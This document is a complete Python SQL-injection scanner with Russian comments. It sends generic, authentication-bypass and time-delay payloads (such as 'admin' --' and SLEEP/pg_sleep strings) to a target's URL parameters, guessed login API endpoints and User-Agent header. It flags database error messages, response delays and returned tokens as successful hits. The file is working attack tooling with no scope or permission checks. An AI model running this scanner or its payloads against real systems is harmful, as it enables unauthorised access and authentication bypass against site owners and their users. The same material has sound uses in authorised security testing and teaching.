import requests
import time
import logging

PAYLOADS = {
    "Generic": ["'", "\"", "' OR '1'='1", '" OR "1"="1', "' OR 1=1 --", "' UNION SELECT NULL,NULL --"],
    "Auth": ["admin' --", "admin' #", "' OR '1'='1' --", "admin'/*"],
    "Time": ["' WAITFOR DELAY '0:0:3' --", "'; SELECT SLEEP(3) --", "' OR pg_sleep(3) --", "'; sleep(3) --"]
}

DBMS_ERRORS = {
    "MySQL": ["SQL syntax", "mysql_fetch", "check the manual that corresponds to your MySQL"],
    "PostgreSQL": ["PostgreSQL query failed", "unterminated quoted string", "syntax error at or near"],
    "Oracle": ["ORA-01756", "ORA-00936", "SQL command not properly ended"],
    "SQL Server": ["Unclosed quotation mark", "SQL Server", "ODBC SQL Server Driver"],
    "SQLite": ["SQLite Error", "sqlite3.OperationalError", "near \"'\": syntax error"]
}

def check_response(response, start_time=None):
    """Анализ ответа на наличие ошибок или задержек"""
    text = response.text.lower()
    
    for db, errors in DBMS_ERRORS.items():
        for err in errors:
            if err.lower() in text:
                return f"Error-based ({db})"
    
    if start_time:
        elapsed = time.time() - start_time
        if elapsed > 3:
            return "Time-based (Blind SQLi)"
            
    return None

def scan_sql_injection(url: str) -> bool:
    """
    Мощный сканер SQLi: GET, POST (JSON/Form), Headers
    """
    print(f"🔍 SQLi scan: {url}")
    target_url = url.split('?')[0]
    vulnerable = False

    if '?' in url:
        for p_type, payloads in PAYLOADS.items():
            for payload in payloads:
                test_url = f"{url}{payload}"
                try:
                    start = time.time()
                    r = requests.get(test_url, timeout=5)
                    res = check_response(r, start if "Time" in p_type else None)
                    if res:
                        print(f"  🔴 HIT: {res} via GET payload '{payload}'")
                        vulnerable = True
                        break
                except: pass
            if vulnerable: break

    api_endpoints = [
        f"{target_url.rstrip('/')}/rest/user/login",
        f"{target_url.rstrip('/')}/api/login",
        f"{target_url.rstrip('/')}/login"
    ]
    
    for api in api_endpoints:
        if vulnerable: break
        for payload in PAYLOADS["Auth"] + PAYLOADS["Generic"]:
            json_data = {"email": payload, "password": "password", "username": payload}
            try:
                r = requests.post(api, json=json_data, timeout=5)
                
                if r.status_code == 200 and ("token" in r.text or "authentication" in r.text):
                    print(f"  🔴 HIT: Auth Bypass (JSON) at {api} with '{payload}'")
                    vulnerable = True
                    break
                
                res = check_response(r)
                if res:
                    print(f"  🔴 HIT: {res} in JSON API at {api}")
                    vulnerable = True
                    break
            except: pass

    if not vulnerable:
        ua_payload = "' OR '1'='1"
        try:
            r = requests.get(url, headers={"User-Agent": ua_payload}, timeout=5)
            if check_response(r):
                print(f"  🔴 HIT: SQLi in User-Agent header")
                vulnerable = True
        except: pass

    if vulnerable:
        print("🟡 SQL Injection vulnerabilities found!")
        return True
    
    print("🟢 SQL Injection clean")
    return False
